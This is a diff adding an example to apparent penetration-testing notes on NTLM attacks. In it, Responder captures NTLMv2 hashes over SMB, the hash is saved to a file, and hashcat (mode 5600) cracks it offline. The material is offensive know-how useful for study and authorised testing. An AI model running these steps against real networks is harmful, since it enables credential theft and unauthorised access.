@@ -37,6 +37,22 @@ $ hashcat -m 5600 <hash_file> <password_file> --force
 
 * `-m 5600`: NetNNTLMv2 (Copy paste directly in browser to maintain fragment: [https://hashcat.net/wiki/doku.php?id=hashcat#:\~:text=5600](https://hashcat.net/wiki/doku.php?id=hashcat))
 
+**Example**
+
+```sh
+$ responder -I <iface>
+...
+
+[SMB] NTLMv2-SSP Client   : ...
+[SMB] NTLMv2-SSP Username : xxx\username
+[SMB] NTLMv2-SSP Hash     : username::xxx:<hash>
+
+$ echo username::xxx:<hash> > ntlmv2-hash
+
+$ hashcat -m 5600 ntlmv2-hash <password_file> --force
+...
+```
+
 #### 2. Relaying the challenge
 
 ...
